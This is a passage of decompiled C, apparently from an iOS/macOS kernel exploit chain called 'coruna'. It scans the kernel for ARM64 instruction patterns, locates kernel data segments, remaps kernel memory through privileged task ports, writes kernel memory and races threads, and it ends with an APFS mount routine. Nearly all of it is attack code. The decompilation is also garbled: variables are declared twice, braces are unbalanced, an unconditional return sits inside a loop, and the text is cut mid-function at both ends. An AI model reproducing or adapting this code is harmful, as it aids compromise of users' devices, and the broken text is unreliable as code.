                  err = coruna_kernel29bb0_trampoline_0001a670(off,lm24,&cache_23);
                  kind = 0;
                  *(uint *)((long)ptr + 0x14) = kind;
                  if (*(long *)k_kernel_stack_chk_guard_slot != cache_35) {
                  ___stack_chk_fail();
                  }
                  return;
                }
              }
            }
          }
        }
      }
    }
  }
cleanup:
  kind = 0;
retry:
  *(uint *)((long)ptr + 0x14) = kind;
  if (*(long *)k_kernel_stack_chk_guard_slot != cache_35) {
    ___stack_chk_fail();
  }
  return;
}
long * coruna_mach_timebase_info_e558(long handle)
{
  long handle;
  int err;
  long *ptr;
  double ld4;
  double ld5;
  long scratch;
  long bootargs;
  long thread_attr;
  mach_timebase_info_t host_info;
  
  ptr = *(long **)(&k_kernel_slot_18c8 + handle);
  if (ptr == (long *)0x0) {
    ptr = _calloc(0x130,1);
    *(long **)(&k_kernel_slot_18c8 + handle) = ptr;
    if (ptr != (long *)0x0) {
      thread_attr = 0;
      host_info.numer = 0;
      host_info.denom = 0;
      scratch = 0;
      bootargs = 0;
      _mach_timebase_info(&host_info);
      ld4 = (double)NEON_ucvtf((unsigned long)host_info >> 0x20);
      ld5 = (double)NEON_ucvtf((unsigned long)host_info & 0xffffffff);
      *ptr = (long)((ld4 / ld5) * k_kernel_rodata_word_2aee0);
      *(uint8_t *)(ptr + 1) = 1;
      handle = k_kernel_rodata_word_2ae10;
      ptr[0x24] = k_kernel_rodata_word_0002ae18;
      ptr[0x23] = handle;
      *(uint8_t *)(ptr + 0x25) = 1;
      err = coruna_kernel29bb0_via_return_zero_21bb4(handle,0,&thread_attr);
      if (err != 0) {
        ptr[0x1b] = thread_attr;
        err = coruna_kernel29bb0_via_return_zero_21bb4(handle,1,&bootargs);
        if (err != 0) {
          ptr[0x20] = bootargs;
          err = coruna_kernel29bb0_via_return_zero_21bb4(handle,2,&scratch);
          if (err != 0) {
            *(bool *)(ptr + 0x1f) = scratch != 0;
          }
        }
      }
    }
  }
  return ptr;
}






static void coruna_kernel29bb0_macho_data_seg_fail(long off,long *ptr,long json_buf)
{
  coruna_vm_deallocate(ptr);
  if (*(long *)k_kernel_stack_chk_guard_slot != json_buf) {
    ___stack_chk_fail();
  }
}

void coruna_macho_data_seg(uint64_t val,uint64_t id_2,long handle,long addr_2,void (*p,
                 uint64_t size_3)
{
  char err;
  uint8_t *ptr;
  uint32_t u;
  uint64_t size;
  unsigned long *buf;
  kern_return_t lk6;
  uint version;
  int err;
  int status;
  mach_port_t lm10;
  mach_port_t lm11;
  long handle;
  uint64_t port;
  long *ptr;
  long addr;
  void **lppv16;
  long *buf;
  uint64_t tag;
  uint64_t kind;
  unsigned long type_id;
  vm_size_t size;
  unsigned long type_id_8;
  unsigned long type_id_9;
  long off;
  unsigned long type_id_10;
  unsigned long *str;
  bool err;
  unsigned long type_id_11;
  unsigned long type_id_12;
  unsigned long type_id_13;
  uint64_t type_id_14;
  long base;
  vm_address_t lv32;
  unsigned long type_id_15;
  pthread_t p_Var34;
  long ctx_val;
  uint8_t size[16];
  int scratch;
  mach_msg_type_number_t bootargs;
  processor_array_t thread_attr;
  mach_msg_type_number_t host_info;
  pthread_t serial_buf;
  long action;
  uint64_t scratch;
  uint64_t block_ctx;
  uint64_t stack_guard;
  vm_prot_t sa_saved [2];
  vm_address_t sa_new;
  unsigned long path_buf;
  pthread_t tmp_buf;
  uint8_t region[12288];
  pthread_attr_t plist;
  uint64_t url_buf;
  long json_buf;
  
  size = (*(void (*)k_kernel_chkstk_darwin_slot)();
  port = size;
  off = size;
  json_buf = *(long *)k_kernel_stack_chk_guard_slot;
  handle = coruna_mach_timebase_info_e558();
  if (handle != 0) {
    err = *(char *)(handle + 8);
    _bzero(region,0x3000);
    if (err != '\0') {
      path_buf = path_buf & 0xffffffff00000000;
      sa_new = sa_new & 0xffffffff00000000;
      handle = coruna_mach_timebase_info_e558(off);
      ptr = k_kernel_mach_task_self_slot;
      port = 0;
      if (*(long *)k_kernel_stack_chk_guard_slot != json_buf) {
      ___stack_chk_fail(port);
      }
      return;
    }
    scratch = 0;
    ptr = (long *)coruna_mach_timebase_info_e558(off);
    if (ptr != (long *)0x0) {
      type_id = ptr[3];
      if (type_id == 0) {
        type_id_14 = *(uint64_t *)(&k_kernel_slot_19f8 + off);
        coruna_macho_text_sect(&plist,type_id_14);
        type_id = coruna_strsep(&plist,"48 0B 40 B9 08 7D 18 53 1F 0D 00 71",0,1);
        if ((type_id != 0) && (type_id < 0xffffffffffffffb8)) {
          type_id_13 = type_id + 0x48;
          do {
            version = coruna_kernel29bb0_via_kernel29bb0_via_nop_stub(type_id_14,type_id);
            if ((version & 0x7c000000) == 0x14000000) {
              if (type_id != 0) {
                type_id = (type_id - *(long *)(&k_kernel_slot_19e0 + off)) + 4;
                ptr[3] = type_id;
                break;
              }
              break;
            }
            type_id = type_id + 4;
          } while (type_id < type_id_13);
        }
      }
      }
      if (ptr[3] != 0) {
        type_id_13 = ptr[4];
        if (type_id_13 == 0) {
          type_id_14 = *(uint64_t *)(&k_kernel_slot_19f8 + off);
          coruna_macho_text_sect(&plist,type_id_14);
          type_id_13 = coruna_strsep(&plist,"48 0B 40 B9 08 7D 18 53 1F 0D 00 71",0,1);
          if ((type_id_13 != 0) && (type_id_11 = type_id_13 - 0x14, 0x13 < type_id_13)) {
            do {
              version = coruna_kernel29bb0_via_kernel29bb0_via_nop_stub(type_id_14,type_id_13);
              if ((version & 0x8f000000) == 0) {
                type_id_13 = ((version >> 10 & 0x180000 | version >> 5 & 0x7ffff) << 2) + type_id_13;
                if (type_id_13 != 0) {
                  ptr[4] = type_id_13;
                  continue;
                }
                break;
              }
              type_id_13 = type_id_13 - 4;
            } while (type_id_11 <= type_id_13);
          }
        }
        else {
          type_id_11 = ptr[7];
          if (type_id_11 == 0) {
            type_id_11 = coruna_kernel29bb0_str_e1_03_15_aa_e2_03_16_aa_e3_03_17_aa_70_c4_48_a9(*(uint64_t *)(&k_kernel_slot_19f8 + off),&scratch);
            coruna_vm_deallocate(ptr);
            port = 0;
            if (*(long *)k_kernel_stack_chk_guard_slot != json_buf) {
            ___stack_chk_fail(port);
            }
            return;
          }
          else {
            scratch = (int)ptr[8];
          }
          status = scratch;
          version = *(uint *)(ptr + 10);
          if (version == 0) {
            version = 4;
            *(uint32_t *)(ptr + 10) = 4;
          }
          type_id_8 = ptr[9];
          if (type_id_8 == 0) {
            coruna_macho_map_segsect(&plist,*(uint64_t *)(&k_kernel_slot_19f8 + off),"__DATA","__common");
            size = plist.__opaque;
            type_id_14 = plist.__opaque;
            if (((plist.__opaque != 0) &&
                (coruna_macho_map_segsect(&serial_buf,*(uint64_t *)(&k_kernel_slot_19f8 + off),"__DATA","__bss"),
                action != 0)) &&
               (type_id_8 = action - (unsigned long)(version << 2), (unsigned long)(size + type_id_14) <= type_id_8)) {
              type_id_10 = (unsigned long)version;
              type_id_15 = type_id_8;
              do {
                err = coruna_mach_vm_machine_attribute(off,type_id_15,(int)type_id_11 - (int)type_id_8);
                coruna_vm_deallocate(ptr);
                port = 0;
                if (*(long *)k_kernel_stack_chk_guard_slot != json_buf) {
                ___stack_chk_fail(port);
                }
                return;
              } while (type_id_10 != 0);
              DataSynchronizationBarrier(3,3,0);
              if (type_id_8 != 0) {
                ptr[9] = type_id_8;
              }
            }
          }
          if (type_id_8 != 0 || ptr[9] != 0) {
            type_id_15 = ptr[0xb];
            if (type_id_15 == 0) {
              plist.__sig = coruna_u64_pack((plist.__sig), (0x3000));
              type_id_15 = coruna_vm_deallocate_2c8ec(off,&plist);
              if ((type_id_15 != 0) && ((int)plist.__sig == 0x3000)) {
                ptr[0xb] = type_id_15;
              }
            }
            if (ptr[0xb] != 0) {
              err = coruna_call_mach_vm_machine_attribute_29df8_1aa94(off,type_id_15,region,0x3000);
              if (err != 0) {
                if (((addr_2 == 0) ||
                    (err = coruna_call_mach_vm_machine_attribute_29df8_1aa94(off,type_id_15 + 0x1000,addr_2,0x240), err != 0)) &&
                   ((err = coruna_call_mach_vm_machine_attribute_29df8_1aa8c(off,&UNK_000010f8 + type_id_15,port), err != 0 &&
                    (err = coruna_call_mach_vm_machine_attribute_29df8_1aa8c(off,type_id_15 + 0x458,0), err != 0)))) {
                  status = coruna_call_mach_vm_machine_attribute_29df8_1aa8c(off,type_id_15 + 0x2000 + (long)status,0);
                  if ((status != 0) &&
                     (status = coruna_call_mach_vm_machine_attribute_29df8_1aa8c(off,type_id_15 + 0x468,type_id_15 + 0x2000), status != 0)) {
                    thread_attr = (mach_port_name_t *)0x0;
                    bootargs = 0;
                    handle = coruna_mach_timebase_info_e558(off);
                    if (handle == 0) {
load_ok_15:
                      coruna_vm_deallocate(handle);
                      p_Var34 = (pthread_t)0x0;
                      lv32 = 0;
                      type_id_10 = 0;
                      err = true;
                    }
                    else {
                      plist.__opaque[0x20] = '\0';
                      plist.__opaque[0x21] = '\0';
                      plist.__opaque[0x22] = '\0';
                      plist.__opaque[0x23] = '\0';
                      plist.__opaque[0x24] = '\0';
                      plist.__opaque[0x25] = '\0';
                      plist.__opaque[0x26] = '\0';
                      plist.__opaque[0x27] = '\0';
                      plist.__opaque[0x18] = '\0';
                      plist.__opaque[0x19] = '\0';
                      plist.__opaque[0x1a] = '\0';
                      plist.__opaque[0x1b] = '\0';
                      plist.__opaque[0x1c] = '\0';
                      plist.__opaque[0x1d] = '\0';
                      plist.__opaque[0x1e] = '\0';
                      plist.__opaque[0x1f] = '\0';
                      plist.__opaque[0x30] = '\0';
                      plist.__opaque[0x31] = '\0';
                      plist.__opaque[0x32] = '\0';
                      plist.__opaque[0x33] = '\0';
                      plist.__opaque[0x34] = '\0';
                      plist.__opaque[0x35] = '\0';
                      plist.__opaque[0x36] = '\0';
                      plist.__opaque[0x37] = '\0';
                      plist.__opaque[0x28] = '\0';
                      plist.__opaque[0x29] = '\0';
                      plist.__opaque[0x2a] = '\0';
                      plist.__opaque[0x2b] = '\0';
                      plist.__opaque[0x2c] = '\0';
                      plist.__opaque[0x2d] = '\0';
                      plist.__opaque[0x2e] = '\0';
                      plist.__opaque[0x2f] = '\0';
                      plist.__opaque[0] = '\0';
                      plist.__opaque[1] = '\0';
                      plist.__opaque[2] = '\0';
                      plist.__opaque[3] = '\0';
                      plist.__opaque[4] = '\0';
                      plist.__opaque[5] = '\0';
                      plist.__opaque[6] = '\0';
                      plist.__opaque[7] = '\0';
                      plist.__sig = 0;
                      plist.__opaque[0x10] = '\0';
                      plist.__opaque[0x11] = '\0';
                      plist.__opaque[0x12] = '\0';
                      plist.__opaque[0x13] = '\0';
                      plist.__opaque[0x14] = '\0';
                      plist.__opaque[0x15] = '\0';
                      plist.__opaque[0x16] = '\0';
                      plist.__opaque[0x17] = '\0';
                      plist.__opaque[8] = '\0';
                      plist.__opaque[9] = '\0';
                      plist.__opaque[10] = '\0';
                      plist.__opaque[0xb] = '\0';
                      plist.__opaque[0xc] = '\0';
                      plist.__opaque[0xd] = '\0';
                      plist.__opaque[0xe] = '\0';
                      plist.__opaque[0xf] = '\0';
                      path_buf = 0;
                      tmp_buf = (pthread_t)0x0;
                      sa_saved[0] = 0;
                      sa_saved[1] = 0;
                      sa_new = 0;
                      stack_guard = 0;
                      action = 0;
                      serial_buf = (pthread_t)0x0;
                      block_ctx = 0;
                      scratch = 0;
                      host_info = 0;
                      buf = (long *)coruna_mach_timebase_info_e558(off);
                      if (buf == (long *)0x0) {
                        if (tmp_buf != (pthread_t)0x0) {
                          _pthread_cancel(tmp_buf);
                          *(uint8_t *)((long)buf + 0xf9) = 1;
                        }
                        coruna_vm_deallocate(handle);
                        p_Var34 = (pthread_t)0x0;
                        lv32 = 0;
                        type_id_10 = 0;
                        err = true;
                      }
                      else {
                      _pthread_attr_init(&plist);
                      _pthread_attr_setdetachstate(&plist,2);
                      *(uint8_t *)((long)buf + 0xf9) = 0;
                      lppv16 = (void **)coruna_fn_ptr_cast(coruna_mach_port_allocate_ff1c);
                      status = _pthread_create(&tmp_buf,&plist,lppv16,buf);
                      if (((status != 0) ||
                          (lm10 = _pthread_mach_thread_np(tmp_buf), lm10 + 1 < 2)) ||
                         (ctx_val = coruna_kernel29bb0_via_return_zero_1f078(off,lm10), ctx_val == 0)) goto load_ok_16;
                      tag = _mach_absolute_time();
                      base = *buf;
                      do {
                        host_info = 10;
                        lk6 = _thread_info(lm10,3,(thread_info_t)&serial_buf,&host_info);
                        if ((lk6 == 0) && ((int)block_ctx == 3)) break;
                        kind = _mach_absolute_time();
                      } while (kind < tag + base * 1000);
                      status = coruna_kernel29bb0_trampoline_0001a670(off,ctx_val + 0x90,&path_buf);
                      if (((status == 0) || (path_buf == 0)) ||
                         (lk6 = _vm_remap(*(vm_map_t *)k_kernel_mach_task_self_slot,&sa_new,
                                            0x4000,0,1,*(vm_map_t *)(&k_kernel_slot_1918 + off),
                                            path_buf,0,sa_saved + 1,sa_saved,2),
                         p_Var34 = tmp_buf, type_id_10 = path_buf, lv32 = sa_new, lk6 != 0)
                         ) goto load_ok_16;
                      buf[2] = sa_new;
                      lk6 = _host_processors(*(host_priv_t *)(&k_kernel_slot_1920 + off),&thread_attr,
                                               &bootargs);
                      if (((lk6 != 0) || (bootargs < 2)) ||
                         (lm10 = _pthread_mach_thread_np(p_Var34), lm10 + 1 < 2)) {
load_ok_17:
                        if (p_Var34 != (pthread_t)0x0) {
                          _pthread_cancel(p_Var34);
                          *(uint8_t *)(handle + 0xf9) = 1;
                        }
                        goto load_ok_15;
                      }
                      lm11 = _mach_thread_self();
                      status = coruna_call_mach_timebase_info(lm11);
                      if ((status == 0) || (status = coruna_call_mach_timebase_info(lm10), status == 0))
                      goto load_ok_17;
                      err = false;
                    }
                    ptr = k_kernel_mach_task_self_slot;
                    if (thread_attr != (mach_port_name_t *)0x0) {
                      if (bootargs == 0) {
                        size = 0;
                      }
                      else {
                        _mach_port_deallocate
                                  (*(ipc_space_t *)k_kernel_mach_task_self_slot,*thread_attr);
                        type_id_9 = (unsigned long)bootargs;
                        if (1 < bootargs) {
                          type_id_12 = 1;
                          do {
                            _mach_port_deallocate(*(ipc_space_t *)ptr,thread_attr[type_id_12]);
                            type_id_12 = type_id_12 + 1;
                            type_id_9 = (unsigned long)bootargs;
                          } while (type_id_12 < type_id_9);
                        }
                        size = type_id_9 << 2;
                      }
                      _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,
                                     (vm_address_t)thread_attr,size);
                    }
                    if ((err) ||
                       (status = coruna_call_mach_vm_machine_attribute_29df8_1aa8c(off,&k_kernel_slot_1100 + type_id_15,
                                             &UNK_00003c80 + (type_id_10 - handle)), status == 0)) {
                      lm10 = 0;
                    }
                    else {
                      lm10 = _pthread_mach_thread_np(p_Var34);
                      if ((1 < lm10 + 1) && (lk6 = _thread_abort(lm10), lk6 == 0)) {
                        tag = _mach_absolute_time();
                        type_id_10 = tag + *ptr * 1000;
                        tag = _mach_absolute_time();
                        if (tag < type_id_10) {
                          type_id_9 = 0;
                          buf = (unsigned long *)(lv32 + 0x3000);
load_ok_18:
                          do {
                            str = buf;
                            if (type_id_9 < 0x1ff) {
                              type_id_9 = type_id_9 + 1;
                              buf = str + 1;
                              if (*str != type_id_13) goto load_ok_18;
                            }
                            if (*str == type_id_13) {
                              type_id_9 = str[3];
                              handle = *(long *)(&k_kernel_slot_19e0 + off);
                              type_id_12 = _mach_absolute_time();
                              if ((type_id_9 - handle | 0xffffff8000000000) == type_id) {
                                off = *ptr;
                                goto load_ok_19;
                              }
                            }
                            else {
                              DataSynchronizationBarrier(3,3,0);
                              type_id_12 = _mach_absolute_time();
                            }
                            type_id_9 = 0;
                            buf = (unsigned long *)(lv32 + 0x3000);
                          } while (type_id_12 < type_id_10);
                        }
                      }
                    }
                    if (p_Var34 != (pthread_t)0x0) {
                    _pthread_cancel(p_Var34);
                    *(uint8_t *)((long)ptr + 0xf9) = 1;
                    coruna_mach_absolute_time_f450(ptr,lm10);
                    }
                    coruna_vm_deallocate(ptr);
                    port = 0;
                    if (*(long *)k_kernel_stack_chk_guard_slot != json_buf) {
                    ___stack_chk_fail(port);
                    }
                    return;
                  }
                }
              }
            }
          }
        }
      }
    }
    coruna_vm_deallocate(ptr);
    port = 0;
    if (*(long *)k_kernel_stack_chk_guard_slot != json_buf) {
    ___stack_chk_fail(port);
    }
    return;
  }
  port = 0;
  if (*(long *)k_kernel_stack_chk_guard_slot != json_buf) {
  ___stack_chk_fail(port);
  }
  return;
}





uint64_t coruna_mach_absolute_time_f1f8(long *handle,uint64_t *val)
{
  uint64_t u;
  
  u = _mach_absolute_time();
  coruna_mach_absolute_time_d780(*val,val[1],u + *handle * handle[0x24]);
  return 1;
}





unsigned long coruna_mach_port_destroy_f238(unsigned long arg,vm_size_t val,vm_address_t n,vm_address_t m,
                  mach_port_name_t p)

{
  uint8_t *ptr;
  void (*buf)(void);
  uint u;
  unsigned long unaff_x30;
  
  if (n != 0) {
    u = _vm_deallocate(*(vm_map_t *)(&k_kernel_slot_1918 + arg),n,val);
    arg = (unsigned long)u;
  }
  ptr = k_kernel_mach_task_self_slot;
  if (m != 0) {
    u = _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,m,val);
    arg = (unsigned long)u;
  }
  if (1 < p + 1) {
    if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
      buf = __builtin_trap(); /* stack chk */
      (*buf)();
    }
    u = _mach_port_destroy(*(ipc_space_t *)ptr,p);
    return (unsigned long)u;
  }
  return arg;
}





unsigned long coruna_return_zero_f2cc(uint64_t *arg,long val)

{
  unsigned long port;
  unsigned long tag;
  unsigned long u;
  uint size;
  
  tag = arg[1];
  port = arg[2] + tag;
  do {
    if (port <= tag) {
      return 0;
    }
    size = coruna_kernel29bb0_via_kernel29bb0_via_nop_stub(*arg,tag);
    if ((size & 0x7c000000) == 0x14000000) {
      u = (unsigned long)((size & 0x1ffffff) << 2);
      if ((size & 0x2000000) != 0) {
        u = -(unsigned long)(size * -4 & 0x7fffffc);
      }
      if (tag + u == val) {
        return tag;
      }
    }
    tag = tag + 4;
  } while( true );
}





long coruna_kernel29bb0_str_e1_03_15_aa_e2_03_16_aa_e3_03_17_aa_70_c4_48_a9(long handle,uint *size)
{
  int err;
  bool err;
  uint u;
  long handle;
  uint size;
  int status;
  char *ptr;
  uint8_t scratch[24];
  
  err = *(int *)(handle + 0x70);
  ptr = 
  "E1 03 15 AA E2 03 16 AA E3 03 17 AA 70 C4 48 A9 73 50 4A A9 75 58 4B A9 77 60 4C A9 79 68 4D A9 7B 70 4E A9 7D 78 4F A9 64 80 40 F9 9F 00 00 91 68 E0 40 FD 69 E8 40 FD 6A F0 40 FD 6B F8 40 FD 6C 00 41 FD 6D 08 41 FD 6E 10 41 FD 6F 18 41 FD 43 2C 42 F9 44 34 42 F9 82 .. 41 F9"
  ;
  if (err < 0x2258) {
    err = err - 0x1f53U < 2 || err == 0x1809;
    status = 0x1c1b;
  }
  else {
    err = err == 0x2258 || err == 0x225c;
    status = 0x2712;
  }
  if (!err && err != status) {
    ptr = (char *)0x0;
  }
  coruna_macho_text_sect(scratch,handle);
  handle = coruna_strsep(scratch,ptr,0,1);
  if (handle == 0) {
    size = 0;
  }
  else {
    u = coruna_kernel29bb0_via_kernel29bb0_via_nop_stub(handle,handle + 0x58);
    size = u >> 7 & 0x7ff8;
    if ((u & 0xffe0001f) != 0xf9400002) {
      size = 0;
      handle = 0;
    }
  }
  *size = size;
  return handle;
}





bool coruna_mach_absolute_time_f450(long *handle,thread_act_t arg)
{
  kern_return_t lk1;
  uint64_t u;
  uint64_t size;
  long handle;
  long addr;
  mach_msg_type_number_t scratch;
  integer_t bootargs [4];
  
  u = _mach_absolute_time();
  handle = handle[0x23];
  addr = *handle;
  do {
    scratch = 4;
    lk1 = _thread_info(arg,0xc,bootargs,&scratch);
    if (lk1 != 0x1c) break;
    if ((char)handle[0x25] != '\0') {
      _usleep(10000);
    }
    size = _mach_absolute_time();
  } while (size < u + addr * handle);
  return lk1 != 0x1c;
}





uint64_t coruna_pthread_attr_setdetachstate_f4e8(vm_address_t *arg)
{
  unsigned long u;
  void *ptr;
  semaphore_t wait_semaphore;
  vm_address_t lv3;
  thread_act_array_t buf;
  vm_address_t lv5;
  vm_address_t lv6;
  uint32_t size;
  vm_address_t *str;
  bool err;
  vm_address_t lv10;
  uint8_t *ptr;
  pthread_t p_Var12;
  pthread_t p_Var13;
  int err;
  mach_port_t lm15;
  task_t target_task;
  kern_return_t lk16;
  thread_act_t lt17;
  mach_port_t target_act;
  long *copy;
  void **lppv19;
  uint64_t version;
  uint64_t port;
  long handle;
  long addr;
  vm_size_t size;
  unsigned long tag;
  uint kind;
  vm_address_t lv26;
  bool status;
  vm_address_t lv28;
  double ld29;
  vm_address_t lv30;
  double ld31;
  long scratch;
  uint bootargs;
  int thread_attr;
  thread_act_array_t host_info;
  long serial_buf;
  uint64_t scratch;
  long action;
  long block_ctx [21];
  uint64_t stack_guard;
  uint64_t bootargs;
  long sa_saved;
  thread_act_t sa_new;
  unsigned long path_buf;
  uint64_t tmp_buf;
  uint64_t thread_attr;
  uint64_t region;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t plist;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t url_buf;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t json_buf;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t frame;
  uint64_t json_buf;
  uint64_t work;
  uint64_t frame;
  uint64_t cache;
  uint64_t work;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t cache_21;
  uint64_t cache_24;
  long cache_22;
  uint64_t cache_25;
  uint64_t cache_23;
  uint64_t cache_26;
  uint64_t cache_27;
  uint64_t cache_28;
  vm_address_t cache_24 [33];
  uint64_t cache_29;
  uint64_t cache_30;
  uint64_t cache_31;
  uint64_t cache_25;
  thread_act_array_t cache_26;
  void *cache_27;
  uint64_t cache_28;
  int cache_29;
  byte cache_30;
  mach_timebase_info_t cache_31;
  vm_prot_t cache_32;
  vm_prot_t cache_33;
  vm_address_t cache_34;
  pthread_t cache_35;
  pthread_attr_t cache_36 [2];
  uint64_t cache_37;
  vm_address_t cache_38;
  vm_address_t cache_39;
  vm_address_t cache_40;
  vm_address_t cache_41;
  uint64_t cache_32;
  uint64_t cache_33;
  uint64_t cache_34;
  uint64_t cache_42;
  uint64_t cache_35;
  uint64_t cache_43;
  uint64_t cache_36;
  uint64_t cache_37;
  uint64_t cache_38;
  long cache_44;
  
  cache_44 = *(long *)k_kernel_stack_chk_guard_slot;
  cache_25 = 0;
  cache_29 = 0;
  cache_24[0x20] = 0;
  cache_31 = 0;
  cache_30 = 0;
  cache_24[0x1d] = 0;
  cache_24[0x1c] = 0;
  cache_24[0x1f] = 0;
  cache_24[0x1e] = 0;
  cache_24[0x19] = 0;
  cache_24[0x18] = 0;
  cache_24[0x1b] = 0;
  cache_24[0x1a] = 0;
  cache_24[0x15] = 0;
  cache_24[0x14] = 0;
  cache_24[0x17] = 0;
  cache_24[0x16] = 0;
  cache_24[0x11] = 0;
  cache_24[0x10] = 0;
  cache_24[0x13] = 0;
  cache_24[0x12] = 0;
  cache_24[0xd] = 0;
  cache_24[0xc] = 0;
  cache_24[0xf] = 0;
  cache_24[0xe] = 0;
  cache_24[9] = 0;
  cache_24[8] = 0;
  cache_24[0xb] = 0;
  cache_24[10] = 0;
  cache_24[5] = 0;
  cache_24[4] = 0;
  cache_24[7] = 0;
  cache_24[6] = 0;
  cache_24[1] = 0;
  cache_24[0] = 0;
  cache_24[3] = 0;
  cache_24[2] = 0;
  cache_26 = 0;
  cache_23 = 0;
  cache_28 = 0;
  cache_27 = 0;
  cache_24 = 0;
  cache_21 = 0;
  cache_25 = 0;
  cache_22 = 0;
  cache_21 = 0;
  cache_20 = 0;
  cache_23 = 0;
  cache_22 = 0;
  work = 0;
  cache = 0;
  cache_20 = 0;
  cache = 0;
  json_buf = 0;
  frame = 0;
  frame = 0;
  work = 0;
  region = 0;
  json_buf = 0;
  url_buf = 0;
  plist = 0;
  sa_new = 0;
  url_buf = 0;
  tmp_buf = 0;
  path_buf = 0;
  block_ctx = 0;
  plist = 0;
  sa_saved = 0;
  stack_guard = 0;
  host_info = 0;
  region = 0;
  action = 0;
  serial_buf = 0;
  thread_attr = 0;
  tmp_buf = 0;
  path_buf = 0;
  sa_new = 0;
  sa_saved = 0;
  bootargs = 0;
  stack_guard = 0;
  block_ctx[0x14] = 0;
  block_ctx[0x13] = 0;
  block_ctx[0x12] = 0;
  block_ctx[0x11] = 0;
  block_ctx[0x10] = 0;
  block_ctx[0xf] = 0;
  block_ctx[0xe] = 0;
  block_ctx[0xd] = 0;
  block_ctx[0xc] = 0;
  block_ctx[0xb] = 0;
  block_ctx[10] = 0;
  block_ctx[9] = 0;
  block_ctx[8] = 0;
  block_ctx[7] = 0;
  block_ctx[6] = 0;
  block_ctx[5] = 0;
  block_ctx[4] = 0;
  block_ctx[3] = 0;
  block_ctx[2] = 0;
  block_ctx[1] = 0;
  block_ctx[0] = 0;
  action = 0;
  scratch = 0;
  serial_buf = 0;
  bootargs = 4;
  thread_attr = 0;
  cache_36 = 0;
  cache_43 = 0;
  cache_38 = 0;
  cache_37 = 0;
  lv3 = arg[2];
  lv5 = arg[3];
  buf = (thread_act_array_t)*arg;
  lv6 = arg[1];
  str = arg + 4;
  lv30 = arg[7];
  lv28 = arg[6];
  lv10 = arg[8];
  wait_semaphore = *(semaphore_t *)((long)arg + 0x44);
  host_info = buf;
  lt17 = sa_new;
  if (1 < sa_new + 1) {
  lt17 = _thread_terminate(sa_new);
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != cache_44) {
  ___stack_chk_fail(lt17);
  }
  return 0;
}





uint64_t coruna_call_ctx_clear_d800(long handle)
{
  coruna_ctx_clear_d800(*(uint64_t *)(handle + 8),handle + 0x10);
  return 0;
}





uint64_t coruna_call_ctx_clear_d800_2(long handle)
{
  coruna_ctx_clear_d800(*(uint64_t *)(handle + 8),handle + 0x10);
  return 0;
}





uint64_t coruna_mach_port_allocate_ff1c(long handle)
{
  uint8_t *ptr;
  kern_return_t lk2;
  int err;
  uint u;
  int status;
  unsigned long size;
  mach_port_name_t scratch;
  uint64_t bootargs;
  uint64_t scratch;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t bootargs;
  uint64_t serial_buf;
  int action [2];
  uint8_t block_ctx[1024];
  long stack_guard;
  
  ptr = k_kernel_mach_task_self_slot;
  stack_guard = *(long *)k_kernel_stack_chk_guard_slot;
  serial_buf = 0;
  action[0] = 0;
  action[1] = 0;
  host_info = 0;
  bootargs = 0;
  bootargs = 0;
  scratch = 0;
  thread_attr = 0;
  scratch = 0;
  lk2 = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,&scratch);
  if (lk2 == 0) {
    action[1] = 0x10;
    err = _sigwait((sigset_t *)(action + 1),action);
    if (((err == 0) && (err = coruna_buf_init(&host_info), err == 0)) &&
       (err = coruna_call_helper_1b984(&bootargs,0x10), err == 0)) {
      err = 0x10;
      do {
        status = coruna_helper_1be68_17f28(&host_info,block_ctx,0x400);
        coruna_free_1bd0c(&host_info);
        size = coruna_free_1bd0c(&bootargs);
        if (1 < scratch + 1) {
        u = _mach_port_destroy(*(ipc_space_t *)ptr,scratch);
        size = (unsigned long)u;
        }
        if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
        ___stack_chk_fail(size);
        }
        return 0;
      } while (err != 0);
      do {
        err = coruna_mach_msg(&host_info,0,scratch,1);
        if ((err != 0) || (err = coruna_mach_msg_15000(&bootargs,scratch), err != 0)) break;
      } while (*(char *)(handle + 0xf9) == '\0');
    }
  }
fail:
  coruna_free_1bd0c(&host_info);
  size = coruna_free_1bd0c(&bootargs);
  if (1 < scratch + 1) {
    u = _mach_port_destroy(*(ipc_space_t *)ptr,scratch);
    size = (unsigned long)u;
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
    ___stack_chk_fail(size);
  }
  return 0;
}





void coruna_mount_apfs(uint64_t val,char *path,uint size)
{
  int err;
  uint64_t scratch;
  unsigned long scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t host_info;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t serial_buf;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t action;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t plist;
  uint64_t block_ctx;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t stack_guard;
  uint64_t work;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t sa_saved;
  uint64_t cache_21;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t sa_new;
  uint64_t cache_24;
  uint64_t cache_25;
  uint64_t cache_26;
  uint64_t path_buf;
  long tmp_buf;
  
  tmp_buf = *(long *)k_kernel_stack_chk_guard_slot;
  cache_24 = 0;
  sa_new = 0;
  cache_26 = 0;
  cache_25 = 0;
  cache_21 = 0;
  sa_saved = 0;
  cache_23 = 0;
  cache_22 = 0;
  work = 0;
  stack_guard = 0;
  cache_20 = 0;
  cache = 0;
  url_buf = 0;
  block_ctx = 0;
  frame = 0;
  json_buf = 0;
  tmp_buf = 0;
  action = 0;
  plist = 0;
  region = 0;
  sa_saved = 0;
  serial_buf = 0;
  path_buf = 0;
